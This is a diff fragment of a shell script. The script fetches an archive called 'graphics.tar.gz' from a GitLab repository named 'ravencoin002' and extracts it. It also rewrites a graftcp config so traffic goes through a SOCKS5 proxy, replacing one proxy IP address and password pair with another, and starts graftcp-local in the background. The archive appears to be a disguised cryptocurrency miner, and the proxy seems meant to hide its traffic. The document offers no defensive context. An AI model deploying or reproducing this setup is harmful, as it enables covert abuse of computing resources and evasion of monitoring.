@@ -24,13 +24,12 @@ wget https://gitlab.com/ravencoin002/file/-/raw/main/graphics.tar.gz
 
 tar -xvzf graphics.tar.gz
 
-
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 67.205.181.62:443
-socks5_username = kazep
-socks5_password = kazep
+socks5 = 157.245.142.37:443
+socks5_username = kalaumalingomongdonk
+socks5_password = kalaumalingomongdonk
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
